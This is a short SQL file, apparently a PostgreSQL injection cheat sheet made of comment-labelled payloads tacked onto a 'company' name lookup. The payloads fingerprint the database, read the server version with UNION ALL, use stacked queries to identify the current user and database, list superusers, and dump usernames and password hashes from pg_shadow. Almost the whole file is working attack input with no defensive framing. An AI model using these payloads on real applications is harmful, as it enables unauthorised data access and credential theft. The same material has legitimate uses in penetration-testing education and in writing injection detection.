/* to test if the database used is PostgreSQL */
select id, name, age from company where name = 'Allen' AND 1::int=1

/* to get version of database and OS installed */
select id, name, age from company where name = 'Allen' UNION ALL SELECT null, version(), null LIMIT 1 OFFSET 1--

/* To identify current user the following can be used */
select id, name, age from company where name = 'Allen' ; select user; -- this is comments or any sql 
select * from company where name = 'Allen' ; select current_user; -- 
select * from company where name = 'Allen' ; select session_user; -- 
select * from company where name = 'Allen' ; SELECT usename FROM pg_user; -- 
select * from company where name = 'Allen' ; SELECT getpgusername(); -- 

/* to know the current database app is working in */
select * from company where name = 'Allen' ; SELECT current_database(); --

/* to get usernames and passwords of all the users */
select * from company where name = 'Allen' ; SELECT usename, passwd FROM pg_shadow; -- 

/* to get all users who have dba privileges */
select * from company where name = 'Allen' ; SELECT usename FROM pg_user WHERE usesuper IS TRUE; -- 

